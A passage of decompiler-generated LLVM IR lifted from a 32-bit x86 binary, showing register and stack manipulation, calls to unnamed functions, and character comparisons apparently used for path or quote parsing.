  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_80543b3.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_80543ba.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_8051590()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_8051fe3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1196 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1196, i32* %ecx.global-to-local, align 4
  %v2_8049ed4197 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4198 = inttoptr i32 %v2_8049ed4197 to i32*
  store i32 1, i32* %v3_8049ed4198, align 4
  %v0_8049edb199 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb200 = inttoptr i32 %v0_8049edb199 to i8*
  %v2_8049edb201 = load i8, i8* %v1_8049edb200, align 1
  %v3_8049edb202 = zext i8 %v2_8049edb201 to i32
  %v4_8049edb203 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb204 = and i32 %v4_8049edb203, -256
  %v6_8049edb205 = or i32 %v5_8049edb204, %v3_8049edb202
  store i32 %v6_8049edb205, i32* %edx.global-to-local, align 4
  %v4_8049edd206 = icmp eq i8 %v2_8049edb201, 0
  store i1 %v4_8049edd206, i1* %zf.global-to-local, align 1
  %v1_8049edf207 = icmp eq i1 %v4_8049edd206, false
  br i1 %v1_8049edf207, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb209 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb201, %dec_label_pc_8049ec0 ]
  %v0_8049edb208 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb199, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb209, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_8050be0(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_8050b30(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_8051500(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_8050b60(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_8051500(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
  %v0_80483a9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80483a7

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f6a
  %v1_8049f8f = add i32 %v0_8049f82, 20756
  store i32 %v1_8049f8f, i32* %edx.global-to-local, align 4
  %v1_8049f96 = add i32 %v0_8049f82, 64
  %v2_8049f96 = inttoptr i32 %v1_8049f96 to i32*
  %v3_8049f96 = load i32, i32* %v2_8049f96, align 4
  store i32 %v3_8049f96, i32* %eax.global-to-local, align 4
  %v2_8049f9a = add i32 %v0_8049f82, 40
  %v3_8049f9a = inttoptr i32 %v2_8049f9a to i32*
  store i32 %v1_8049f8f, i32* %v3_8049f9a, align 4
  %v0_8049f9e = load i32, i32* @esp, align 4
  %v1_8049f9e = add i32 %v0_8049f9e, 48
  %v2_8049f9e = inttoptr i32 %v1_8049f9e to i32*
  %v3_8049f9e = load i32, i32* %v2_8049f9e, align 4
  %v1_8049fa2 = add i32 %v0_8049f9e, 20612
  store i32 %v1_8049fa2, i32* %ecx.global-to-local, align 4
  %v0_8049fa9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fa9 = add i32 %v0_8049fa9, 16
  store i32 %v1_8049fa9, i32* %eax.global-to-local, align 4
  %v1_8049fac = add i32 %v3_8049f9e, 1452
  %v9_8049fac = icmp eq i32 %v1_8049fac, 0
